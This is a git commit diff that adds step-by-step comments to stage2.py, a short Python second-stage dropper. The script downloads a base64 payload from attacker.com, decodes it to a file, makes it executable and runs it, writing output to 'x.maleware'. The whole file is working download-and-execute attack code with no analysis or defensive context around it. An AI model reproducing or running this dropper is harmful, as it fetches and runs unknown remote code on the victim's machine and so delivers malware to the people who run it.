8eba9f7eeafeda1244a15deb9ab00c1ee806d5c9
zcool2019 <31634820+zcool2019@users.noreply.github.com>
2021-08-10 18:53:40 +0200

    Update stage2.py

--- stage2.py
+++ stage2.py
@@ -2,14 +2,23 @@ import base64
 import os
 import time
 import requests
-time.sleep(5)
-req=requests.get('http://attacker.com/b64')
 
+#Sleep 5 seconds
+time.sleep(5)
+
+#Get base64 payloS
+req=requests.get('http://attacker.com/b64')
 b64=req.content
+
+#Decode payload
 decoded=base64.decodebytes(b64)
+
+#Write content to binwary file
 with open("bin","wb") as out :
 	out.write(decoded)
 	out.close()
+#Set execution permissions
 os.system('chmod +x bin')
 time.sleep(1)
+#Execute final stage 
 os.system('./bin > x.maleware')
